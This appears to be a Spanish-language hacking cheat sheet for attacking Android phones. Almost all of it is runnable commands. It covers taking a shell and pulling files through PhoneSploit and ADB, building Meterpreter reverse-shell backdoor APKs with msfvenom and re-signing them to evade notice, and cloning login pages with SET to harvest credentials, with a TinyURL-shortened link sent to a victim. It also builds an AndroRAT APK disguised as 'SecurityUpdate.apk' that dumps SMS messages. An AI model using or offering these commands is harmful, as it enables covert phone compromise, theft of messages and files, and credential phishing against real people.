# Hacking a plataformas móviles 

Tags: #Hacking #Android #Ñ 

## PhoneSploit

```bash 
# Kali Tool para conectarse a un celular Android a la PC con el 'ADB-enabled' y análisis binario  
❯ apt install adb        # Instalar la herramienta 
❯ git clone https://github.com/prbhtkumr/PhoneSploit/tree/master   # Descargar la tool e ir al dir
	❯ python3 -m venv myenv 
	❯ source myenv/bin/activate
❯ pip install colorama 

Nota:
	1. El puerto al que se debe de conectar el es 5555


❯ python3 phonesploit.py   # Ejecutar la herramienta 

	❯ 3                   # Conectar un nuevo telefono 
	❯ IP_Phone            # Agregar la dirección IP del telefono  
	❯ p                   # Cambiar de pagina para ver mas opciones en PhoneSploit
	❯ b                   # Regresar al menu anterior 
		❯ 4              # Acceder a una shell en el dispositivo 
		❯ IP             # Cuando te pide ingresar el nombre, es la IP del dispositivo
		❯ pwd            # Mirar el directorio actual esperando que sea la raiz '/'
		❯ ls             # Listar el contenido 
		❯ cd sdcard      # Ir a la tarjeta SD 
		❯ cd Download    # Ir al directorio donde se encuentra la imagen a descargar 
		❯ cat file.txt   # Mirar el contenido del archivo 
		❯ exit
	❯ 9                   # Descargar folders desde el telefono a la PC
		❯ /sdcard/Dir/Image.png   # Ruta del telefono a descargar 
		❯ /home/kali/Desktop      # Ruta del PC en donde se guardará el folder 
	❯ 7                   # Screen shot a picture on a phone
		❯ /home/kali/Desktop    # Agregar la ruta en donde se guardará el Screen Shot 
	❯ 14                  # Lista todas las aplicaciones en el telefono 
	❯ 15                  # Ejecutar una aplicación 
		❯ com.android.calculator2   # Ejecutar la acción e iniciar la calculadora en el telefono 
	❯ 18                  # Muestra info de Mac/Inet
	❯ 21                  # NetStat que es el status de la conectividad de red 
	❯ 24                  # Obtener el Keycode 
```

## ADB

```bash 
# Powershell Tool para conectarse a un celular Android a la PC con el 'ADB-enabled'
❯ adb devices            # Mirar los dispositivos disponibles para la conexión
❯ adb connect IP:5555    # Cenectar al dispositivo Android 
❯ adb shell              # Obtener una shell del dispositivo

	❯ ls                # Listar el contenido 
	❯ cd sdcard         # Ir al directorio 
```

## Binary payloads

```bash 
# Kali Tool
❯ mfsvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=IP R > backdoor.apk  

	# a = Arquitectura dalvik 
	# R = Raw 

❯ use exploit/multi/handler 
	❯ set payload android/meterpreter/reverse_tcp
	❯ set lhosts IP 
	❯ exploit -j -z       # Lo ejecutará en segundo plano 
	❯ sessions -l         # Listar las sesiones 
	❯ sessions -i 1       # Interactuar con la sesión 1 

❯ sysinfo       # Muestra la info del sistema Android 
❯ ipconfig      # Muestra las interfaces y direcciones IP 
❯ pwd           # Muestra la ruta 
❯ cd /sdcard    # Ir a la ruta de la tarjeta SD
❯ ps            # Mirar los procesos 
```

```bash 
# Kali Tool para hacer de forma mas ofuscada 
❯ mfsvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=443 R > meterpreter.apk   

❯ keytool -genkey -v -keystore myname.Keystore -alias prueba -keyalg RSA -keysize 2048 -validity 10000
❯ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore myname.Keystore meterpreter.apk prueba
❯ jarsigner -verify -verbose -certs meterpreter.apk
❯ apt install zipalign
❯ zipalign -v 4 meterpreter.apk entrar.apk 
```

## Social-Engineer Toolkit

* [TinyURL](https://tinyurl.com/)

```bash 
# Kali Tool para la recolección de usuarios 
❯ setoolkit        # Iniciamos la herramienta 

	❯ 1           # Ataques de ingeniería social 
	❯ 2           # Vectores de ataque hacia un sitio web 
	❯ 3           # Método de ataque 'Credential Harvester'
	❯ 2           # Clonar sitio 
	❯ Dejar la misma IP y agregar el sitio a clonar 'www.domain.com/dir/index.html'
	❯ La herramienta se queda en la escucha 

Nota:
	1. Se debe mandar el enlace malicioso a la víctima 
	2. Se puede colocar la url en un acortador como 'TinyURL'
```

## AndroRAT

```bash 
# Kali Tool 
❯ python3 androRAT.py --build -i IP -p 443 -o SecurityUpdate.apk    # Crear un APK malicioso para pasarlo al android victima 

	# o = Output 
	# build = Es para construir el APK 


❯ python3 androRAT.py --shell -i 0.0.0.0 -p 443   # Escuchar con la herramienta en cualquier dirección para obtener la conexión 
	
	❯ deviceInfo        # Mirar la info del dispositivo 
	❯ getSMS inbox      # Guarda los mensajes SMS en un archivo '.txt' y lo guarda en el dir 'Dumps'
	❯ getMACAddress     # Mirar la MAC Address 
```